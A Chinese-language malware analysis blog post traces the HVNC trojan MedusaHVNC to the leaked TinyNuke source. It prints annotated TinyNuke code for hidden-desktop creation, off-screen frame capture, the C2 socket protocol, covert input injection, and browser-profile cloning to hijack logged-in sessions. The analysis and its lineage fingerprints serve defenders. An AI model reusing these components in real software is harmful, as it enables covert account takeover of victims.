---
layout:     post
title:  HVNC木马架构同源分析-TinyNuke&MedusaHVNC
subtitle:
date:       2026-10-17
author:     Closure
header-img: img/dh.png
catalog: true
tags:
- 安全
---

MedusaHVNC是最近的MaaS木马，售卖页上包含文件/注册表/进程管理/Clipper/SOCKS5 反向代理/键盘记录/普通VNC/HVNC/内存执行/浏览器凭据恢复。

HVNC技术上做的事很朴素，无非是利用Windows的window station/desktop隔离机制开一个不可见的桌面，或者在内置的隐藏浏览器实例里操作，然后在那个平行桌面里启动浏览器，加载偷来的或就地骑乘的会话通过反向连接把屏幕帧推给C2，再把操作的键鼠注入回那个桌面。

HVNC到现在还不能算过气，它不像是一般通过恶意代码的自动化程序，整个流程下总要有一个碳基人类操作，HVNC它花的成本是一个人盯一台肉鸡，所以HVNC用来铺量是不合适的

![ ](/img/20261018-1.png)
![ ](/img/20261018-2.png)
![ ](/img/20261018-3.png)

但是这一篇更想结合起来讲一下它的前身TinyNuke，**HVNC这个品类在恶意软件语境里几乎就是TinyNuke一手定义并开源化的**，2016年就在暗网以HiddenDesktop/VNC作为核心卖点出售，2017年源码泄露后成为教材，MedusaHVNC的核心宣传语是在受害者不可见的独立Windows桌面里开浏览器，加载现有profile骑在已登录会话上，对上的就是TinyNuke产品定义。

![ ](/img/20261018-4.png)

~~就像看到勒索软件双层勒索就想到Maze一样~~，TinyNuke奠定的和MedusaHVNC继承的那套东西，都是在受害者会话内部再造一个平行的桌面。

~~TinyNuke还是我之前取用过零件的项目~~，它的零件可以直接解决Windows原生问题，怎么让一个桌面不被看见/怎么给一个不渲染到屏幕的桌面拍照片/怎么让第二个浏览器实例继承第一个的登录态，问题来自Windows的架构本身，微软没有动机去改，隐藏桌面今天和2017年一样合法且不可见，单实例锁今天也锁着Chrome。

这些目前没有可替代的实现， 这也算是TinyNuke区别于其他普通恶意代码的地方吧，大多数技术都有替代方案，注入可以换技术，加密可以换算法，通信也可以换协议，但是对离屏桌面取帧绕不开PrintWindow，进程窗口归属隐藏桌面绕不开lpDesktop这一个参数，所以后来的每一次创新都只是打补丁。

很多安全产商对CreateDesktopA、PrintWindow、PostMessage这一层几乎视而不见，呃呃很多安全厂商**连对CreateDesktopA这类函数的简单监控都没有**，可能是它的行为特征和 TeamViewer/远程协助/无障碍软件共用同一组 API(

## 一些可能有用的前置小知识

### Hidden Desktop

Windows的Desktop是窗口站下的内核级隔离对象，每个交互会话可以有多个Desktop，用户屏幕上看到的是WinSta0\Default，而程序可以用CreateDesktopA()新建一个 Desktop，有独立的窗口树、消息队列、剪贴板和前台状态，用户切任何视图、按Alt+Tab都看不到它。

CreateDesktopA(name, …, GENERIC_ALL) 创建对象；OpenDesktopA 复用已有对象
SetThreadDesktop(hDesk) 把线程挂到该桌面，之后这个线程的 EnumWindows、WindowFromPoint、消息收发全部只作用于隐藏桌面

CreateProcessA时设STARTUPINFO.lpDesktop=桌面名，让新进程出生就在隐藏桌面里，TinyNuke 启动浏览器用的就是这个参数

### PrintWindow 逐窗口采集

**为什么不用整屏截图?**

远程控制要看见隐藏桌面，最直接的想法是BitBlt抓整个桌面DC，但是整屏抓取有两个问题，一是被其他窗口遮挡的部分抓不到真实内容，二是对DWM合成下的分层窗口经常抓出黑块。

HVNC的做法是逐窗口采集，用 GetTopWindow/GetWindow(GW_HWNDPREV) 自底向上枚举顶层窗口，对每个窗口调PrintWindow(hWnd, memDC, flags)，让窗口自己把内容画进一块内存DC，不从屏幕上截像素，再用BitBlt把各窗口的位图合成到帧缓冲，之后顺手给窗口加 WS_EX_COMPOSITED防止它被重绘时下一帧出现空洞。

补充一个演进细节，老代码用 PrintWindow(…, 0)，对现代 Chromium会抓出黑屏，2016年引入的PW_RENDERFULLCONTENT 标志才让PrintWindow能取到合成后的完整内容，新旧 HVNC 实现的分水岭之一就在这个flag上。

### 帧差分编码与LZNT1压缩

屏幕帧原始数据巨大所以直接发不现实。这类木马的方案是经典的差分加压缩两步

- 差分：帧与帧之间绝大部分像素不变。做法是逐像素对比当前帧和上一帧，把没变的像素改写成一种罕见颜色（TinyNuke 用 RGB(255,174,201)，一种几乎不会自然出现的粉色）作为"透明"标记；接收端收到后遇到该颜色就跳过不覆盖，只把变化的像素叠加到本地底板上。为防止真实画面里恰好出现这个颜色，发送端会先把真值撞色像素的 G 通道 +1 做区分。若整帧无变化，只发一个 0 标记。
- 压缩：差分后的数据里大量重复，过一遍 RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1，LZNT1 是 Windows 内核自带的压缩格式，ntdll 里直接可调。

零依赖不需要 libjpeg、zlib，代价是抗误码差和无加密，判断一个HVNC实现血统时，用什么颜色当透明标记是极好的指纹，因为太随意了，抄谁的代码就带谁的颜色。。。。

### Profile克隆

攻击者要的是浏览器里已登录的网银/邮箱/企业SSO会话，不是传统的密码，障碍是Chrome 的单实例锁，同一时刻只允许一个进程使用某个Profile目录，解法是复制整个Profile目录让隐藏桌面里的浏览器以 --user-data-dir=<副本> 启动。Cookie、登录态、扩展、甚至已记住的表单数据全在副本里。

Firefox同理，解析profiles.ini拿到Profile路径，CopyDir后用 -no-remote -profile <副本> 启动，IE没有单实例锁直接启动。

这项技术在商业HVNC的营销话术里就叫Cloning，Clones Chrome, Edge, Brave, Firefox and Telegram while they are actively logged in

### PostMessage与SendInput

让远控能点能输有两条技术路线，路线一是PostMessage消息重放，收到操作端的三元组后用WindowFromPoint找到坐标下的窗口，再ChildWindowFromPoint逐层下钻到最深层子控件，最后PostMessageA 把消息直接塞进目标窗口的消息队列。

因为消息不经过全局输入队列，所以受害者桌面上看不到任何鼠标移动，这是HVNC隐形的另一半原因，代价是要自己实现窗口管理，全靠WM_NCHITTEST返回的HT*命中码手动模拟。

路线二是SendInput，也就是MedusaHVNC的实现，SendInput走硬件级注入路径，合成带完整扫描码/鼠标轨迹的输入事件，效果等同于真键盘真鼠标，它能驱动PostMessage驱动不了的场景，像无句柄的DirectUI/XAML控件和需要真实输入校验的目标&系统级快捷键。

### 为什么HVNC传输独立于C2

Zeus时代的银行木马面板走HTTP轮询，但是视频流不能让面板中转，这样延迟和并发都扛不住，所以所以HVNC采用带外设计，面板只发一条start HVNC host:port命令，bot随后主动连出两条独立TCP连接到HVNC专用服务器。

desktop通道是纯上行，协商尺寸 → 差分 → 压缩 → 等 ACK，input通道是纯下行，收输入三元组，两条连接靠源IP在服务端配对。

### 两个小件

SetWindowsHookExW(WH_KEYBOARD_LL, …)是全局低级键盘钩子，键盘记录器的标准做法，在 HVNC类样本里看到它会首先怀疑它属于Keylogger模块而不是远控模块。

剪贴板API同理，在商业RAT里它通常是Clipper模块，比如拿来监视剪贴板和把加密货币地址换成攻击者的。

## TinyNuke

↑说了，MedusaHVNC做的所有新意都能在TinyNuke源码里找到原始决策和改动理由。

```
TinyNuke/
├── Bot/                    ← 受害者侧 agent
│   ├── Main.cpp            入口，拉起各模块线程
│   ├── Bot.cpp             主控：连 PHP 面板、轮询命令、分发执行
│   ├── HiddenDesktop.cpp   ★ HVNC 隐藏桌面（本文主角）
│   ├── FirefoxChrome.cpp   FormGrabber/WebInject 浏览器钩子
│   ├── IE.cpp              IE 钩子
│   ├── Socks.cpp           反向 SOCKS4 隧道
│   └── ...
├── HiddenDesktop/Server/   ← 攻击者侧 HVNC 查看器（独立 exe）
├── SocksServer/            ← 攻击者侧 SOCKS4 服务端
├── Loader/                 ← 投递器
├── panel/                  ← PHP + MySQL C2 面板
├── Api.cpp                 ← Win32 API 动态解析表 + 字符串混淆
├── MinHook/                ← inline hook 库（源码级引入）
└── wow64ext/               ← 32 位进程调 64 位 API 的桥
```

2017年的工业级做法是MinHook源码级引入，FormGrabber要hook浏览器的网络函数抓 HTTPS明文，TinyNuke直接把MinHook编进工程里面了，以及wow64ext， Bot是32位进程，但是 64位系统上浏览器是64位进程，32位代码无法直接操作64位进程的内存和线程，wow64ext 提供了一座桥，让小木马能跨位数抓浏览器。

这个前瞻性在于用最小的体积和最合法的 API做最完整的账户接管工具链

如图(鸣谢KIMI），HVNC的C2是带外直连所以不走面板 HTTP 通道，两条 socket一上一下，靠源IP在服务端配对，所有魔法都发生在受害者机器上。

![ ](/img/20261018-5.png)

### 隐藏桌面

MainThread是HVNC模块的入口，桌面创建的全部逻辑:

```
// Bot/HiddenDesktop.cpp:731-734
Funcs::pMemset(g_desktopName, 0, sizeof(g_desktopName));
GetBotId(g_desktopName);                                    // 桌面名 = 本机 BotID

g_hDesk = Funcs::pOpenDesktopA(g_desktopName, 0, TRUE, GENERIC_ALL);
if(!g_hDesk)
   g_hDesk = Funcs::pCreateDesktopA(g_desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
Funcs::pSetThreadDesktop(g_hDesk);
```

三个API各有明确分工：

- `CreateDesktopA` 在内核里新建一个 Desktop 对象。Desktop 是窗口站下的隔离容器，独立窗口树、独立消息队列、独立剪贴板、独立前台状态。用户按 Alt+Tab 翻遍所有视图也看不到它，因为系统只把 `WinSta0\Default` 渲染到物理屏幕。
- 桌面名用GetBotId生成，而BotID来自卷序列号过一个 LCG，同一个命名习惯让按固定桌面名做检测失效，同时给双通道配对提供了身份标识。
- SetThreadDesktop是隐形的关键，它把线程绑进隐藏桌面，之后这个线程调用的`EnumWindows、WindowFromPoint、PostMessage全部只作用于这个平行世界。

CreateDesktopA的第四个参数是0，没有传DF_ALLOWOTHERACCOUNTHOOK之类的标志，更没有SwitchDesktop，这个桌面永远不切换前台 永远不被渲染，这是Hidden的完整实现。

这套组合不可绕过的原因是没有用独立桌面，浏览器窗口直接出现在受害者屏幕上，用了独立桌面但启动进程时不设lpDesktop，窗口默认落到Default桌，一样暴露，所以命名桌面+线程绑定+进程归属是HVNC隐蔽性的唯一可行解，MedusaHVNC销售页上的spawns a cloned,invisible Windows desktop session"，说的就是这部分代码干的事情。

### 取帧管线

远控要看见隐藏桌面第一个障碍是这个桌面没有显示设备，BitBlt抓GetDC(NULL)拿到的是黑屏或受害者桌面，TinyNuke的解法是绕开屏幕

逐窗口枚举与采集

```
HDC     hDcWindow  = Funcs::pCreateCompatibleDC(hDc);
HBITMAP hBmpWindow = Funcs::pCreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);
Funcs::pSelectObject(hDcWindow, hBmpWindow);
if(Funcs::pPrintWindow(hWnd, hDcWindow, 0))           
{
   Funcs::pBitBlt(hDcScreen, rect.left, rect.top,
      rect.right - rect.left, rect.bottom - rect.top,
      hDcWindow, 0, 0, SRCCOPY);                     
   ret = TRUE;
}





// Bot/HiddenDesktop.cpp:68-86  EnumHwndsPrint:自底向上遍历顶层窗口
if(!Funcs::pIsWindowVisible(hWnd))
   return TRUE;

PaintWindow(hWnd, data->hDc, data->hDcScreen);

DWORD style = Funcs::pGetWindowLongA(hWnd, GWL_EXSTYLE);
Funcs::pSetWindowLongA(hWnd, GWL_EXSTYLE, style | WS_EX_COMPOSITED);   

Funcs::pGetVersionExA(&versionInfo);
if(versionInfo.dwMajorVersion < 6)                    
   EnumWindowsTopToDown(hWnd, EnumHwndsPrint, (LPARAM) data);
```

### 为什么用PrintWindow不用BitBlt整屏截?

PrintWindow是让窗口过程把内容画进我给的DC，拿到的是窗口的完整自绘内容不受遮挡影响，哪怕这个窗口被另一个窗口压住抓出来也是完整画面，这是少数能看见离屏桌面真实内容的方法。

**为什么自底向上?**

EnumWindowsTopToDown从GW_HWNDLAST往GW_HWNDPREV走，先画被压住的窗口、后画压在上面的合成结果自然正确。

**为什么画完要补 `WS_EX_COMPOSITED**

被遮挡的下层窗口被强行重绘时，只重绘露出部分，合成画面就出一个黑块，双缓冲样式强制窗口整面重绘

**差分编码**

帧原始数据1080p约6MB，不能帧帧发，GetDeskPixels的做法是VNC思想的复刻，与上一帧逐像素对比，没变的不发

```
// Bot/HiddenDesktop.cpp:8 + 166-180
static const COLORREF gc_trans = RGB(255, 174, 201);      

   for(DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage; i += 3)
   {
      if(g_pixels[i]==g_oldPixels[i] && g_pixels[i+1]==g_oldPixels[i+1] && g_pixels[i+2]==g_oldPixels[i+2])
      {
         g_pixels[i]   = GetRValue(gc_trans);            
         g_pixels[i+1] = GetGValue(gc_trans);
         g_pixels[i+2] = GetBValue(gc_trans);
      }
      else same = FALSE;
   }
   if(same) return TRUE;
```

发之前还有一个防碰撞处理，如果真实画面里恰好出现这个粉色，就先把它的G通道 +1，接收端收到后减回来，接收端遇到透明色就跳过不覆盖只把变化像素叠加到本地底板帧上。

然后过 LZNT1 压缩：

```
// Bot/HiddenDesktop.cpp:250-261
Funcs::pRtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);
Funcs::pRtlCompressBuffer(COMPRESSION_FORMAT_LZNT1, g_pixels, g_bmpInfo.bmiHeader.biSizeImage,
   g_tempPixels, g_bmpInfo.bmiHeader.biSizeImage, 2048, &size, workSpace);
```

LZNT1而不是zlib/libjpeg的原因是Windows内核自带，ntdll里直接可调，零依赖、体积小

顺带说一下透明色这个值是随手选的，正因为随手所以抄代码的人就原样带着它，24bpp BGR 内存序下搜索字节C9 AE FF，配合LZNT调用是区分思想同源和代码同源的指标((

### 一个后来才暴露的缺陷

`PrintWindow(…, 0)` 的flags参数为0，意味着按兼容模式绘制，对Win7没问题，但是现代 Chromium用DirectComposition渲染，PrintWindow(0)抓出来是黑屏，2016年微软加了 PW_RENDERFULLCONTENT才让PrintWindow能取到合成内容。

TinyNuke的fork Meltedd在2026年commit里就是改了这一行

###协议层

```
// Bot/HiddenDesktop.cpp:4-7
enum Connection { desktop, input };
enum Input      { mouse };
static const BYTE gc_magik[] = { 'A','V','E','_','M','A','R','I','A',0 };
```

AVE_MARIA这个握手串是TinyNuke最著名的指纹，**因为它没用**

```
// Bot/HiddenDesktop.cpp:223-225 + 268-283
if(Funcs::pSend(s, (char*)gc_magik, sizeof(gc_magik), 0) <= 0) goto exit;   
if(SendInt(s, Connection::desktop) <= 0) goto exit;                        

// desktop 通道的帧协议,字段顺序固定:
if(SendInt(s, rect.right) <= 0)  goto exit;                    
if(SendInt(s, rect.bottom) <= 0) goto exit;                   
if(SendInt(s, g_bmpInfo.bmiHeader.biWidth)  <= 0) goto exit;  
if(SendInt(s, g_bmpInfo.bmiHeader.biHeight) <= 0) goto exit;  
if(SendInt(s, size) <= 0) goto exit;                           
if(Funcs::pSend(s, (char*)g_tempPixels, size, 0) <= 0) goto exit;
DWORD response;
if(Funcs::pRecv(s, (char*)&response, sizeof(response), 0) <= 0) goto exit;
```

### 为什么是双通道

Bot对HVNC服务器开两条独立TCP连接，一条专发帧一条专收输入，服务端用对端IP把两条连接配成同一个Client，因为带宽特性完全不同、生命周期不同、协议极简。

操作者的查看窗口多大帧就缩放成多大发，不存在你屏幕4K我屏幕720p的适配问题，协议第一对字段就是查看器宽高，MedusaHVNC面板里那个画质滑条对应的正是这里的协商参数。

### 输入子系统

这是TinyNuke最见功力的模块，也是后来变化最大的模块。

```
// Bot/HiddenDesktop.cpp:444-449  InputThread 收包
if(Funcs::pRecv(s, (char*)&msg,    sizeof(msg),    0) <= 0) goto exit;
if(Funcs::pRecv(s, (char*)&wParam, sizeof(wParam), 0) <= 0) goto exit;
if(Funcs::pRecv(s, (char*)&lParam, sizeof(lParam), 0) <= 0) goto exit;
```

查看端发来的就是一个 `(msg, wParam, lParam)` 三元组，把攻击者的鼠标键盘事件原样转发不做任何合成，木马端拿到后做找窗口和投消息。

### 窗口定位

```
// Bot/HiddenDesktop.cpp:700-712
for(HWND currHwnd = hWnd;;)
{
   hWnd = currHwnd;
   Funcs::pScreenToClient(currHwnd, &point);
   currHwnd = Funcs::pChildWindowFromPoint(currHwnd, point);
   if(!currHwnd || currHwnd == hWnd)
      break;
}
if(mouseMsg) lParam = MAKELPARAM(point.x, point.y);
Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
```

先WindowFromPoint拿坐标下的顶层窗口，再循环ChildWindowFromPoint逐级下钻到最深层子控件，屏幕坐标换算成客户区坐标，最后PostMessageA把消息塞进这个窗口的消息队列。

这是理解隐形的另一半就要搞懂为什么选PostMessage而不选SendInput，PostMessage不经过全局输入队列，没有真实的光标移动也没有键盘焦点切换、不产生LLKHF_INJECTED标记。

浏览器窗口线程在自己的隐藏桌面里正常泵消息，收到伪造的WM_LBUTTONDOWN就执行点击，受害者真实桌面的焦点状态纹丝不动。代价是必须自己实现窗口管理，PostMessage只投递消息不处理标题栏拖拽"这类系统行为，TinyNuke于是写了一大段WM_NCHITTEST处理

```
// Bot/HiddenDesktop.cpp:549-580  单击释放时做命中测试
LRESULT lResult = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
switch(lResult)
{
   case HTTRANSPARENT:    // 透明窗口:临时禁用再测一次(点击穿透)
      Funcs::pSetWindowLongA(hWnd, GWL_STYLE, Funcs::pGetWindowLongA(hWnd, GWL_STYLE) | WS_DISABLED);
      lResult = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
      break;
   case HTCLOSE:          Funcs::pPostMessageA(hWnd, WM_CLOSE, 0, 0);            break;
   case HTMINBUTTON:      Funcs::pPostMessageA(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0); break;
   case HTMAXBUTTON:      /* SC_MAXIMIZE / SC_RESTORE */                          break;
}
```

拖动手势则根据命中码，手动算新矩形再MoveWindow

```
// Bot/HiddenDesktop.cpp:588-607  开始按钮 + #32768 菜单
HWND hStartButton = Funcs::pFindWindowA("Button", NULL);
...
if(!Funcs::pLstrcmpA(windowClass, Strs::hd1))   // hd1 = "#32768"(Win32弹出菜单类)
{
   HMENU hMenu = (HMENU)Funcs::pSendMessageA(hWnd, MN_GETHMENU, 0, 0);
   int itemPos = Funcs::pMenuItemFromPoint(NULL, hMenu, point);
   Funcs::pPostMessageA(hWnd, 0x1e5, itemPos, 0);          // MN_SELECTITEM
   Funcs::pPostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
   continue;
}
```

等于在代码里重写了半套资源管理器交互，读完InputThread会发现它有三个面向Win7的硬假设，第一个是目标得有HWND且消费Posted消息，新版开始菜单/任务栏/Chrome的Aura UI没有传统 HWND，ChildWindowFromPoint下钻不到控件，消息post给宿主窗口后无人消费。

第二个是类名可识别，#32768是Win32弹出菜单类，Win10/11的开始菜单不是，FindWindowA("Button")找的开始按钮自Win7就没了，以及最后的WM_NCHITTEST语义可靠，DWM 合成/UWP窗口不处理该消息，窗口拖不动也关不掉。

BlackFog报告里MedusaHVNC的API清单出现了SendInput，硬件级注入不依赖目标HWND 的消息队列，恰好绕过↑的三个盲区。

### 浏览器启动

HVNC模块的终点是把浏览器拉进隐藏桌面

```
// Bot/HiddenDesktop.cpp:297-320
Funcs::pLstrcpyA(dataPath, chromePath);
Funcs::pLstrcatA(dataPath, Strs::hd10);          
Funcs::pLstrcpyA(newDataPath, chromePath);
GetBotId(botId);
Funcs::pLstrcatA(newDataPath, botId);            
CopyDir(dataPath, newDataPath);                  

...
Funcs::pLstrcatA(path, Strs::hd9);   // " --no-sandbox --allow-no-sandbox-job --disable-3d-apis
                                     //  --disable-gpu --disable-d3d11 --user-data-dir="
Funcs::pLstrcatA(path, "\"");
Funcs::pLstrcatA(path, newDataPath);
startupInfo.lpDesktop = g_desktopName;           
Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);




// Bot/HiddenDesktop.cpp:372-393  Firefox 走 profiles.ini + -no-remote
GetBotId(botId);
Funcs::pLstrcpyA(newPath, firefoxPath);
Funcs::pLstrcatA(newPath, botId);
CopyDir(realPath, newPath);                      
...
Funcs::pLstrcatA(browserPath, Strs::hd14);
```

Chrome有单实例锁，同一Profile只允许一个进程，直接指会启动失败或者更糟，所以CopyDir整目录克隆一份，锁的问题就消失了。

对照MedusaHVNC销售页的原文："**Spawns a*cloned, invisible Windows desktop session… Clones*Chrome, Edge, Brave, Firefox, and Telegram while they are actively logged in**"

黑产把这套CopyDir起了个名字叫Cloning写进广告词了，营销话术和源码结构对应上了，还有个细节是销售页给Outlook/Thunderbird/Foxmail 标了auto-close before HVNC，TinyNuke用克隆绕开冲突实例，fork Meltedd的StartBrave直接killproc("brave.exe")杀掉再启。

MedusaHVNC则启动前自动关邮件客户端，这些都是为了消除已有实例对隐藏会话的干扰并防止邮件客户端在错误桌面弹窗暴露。



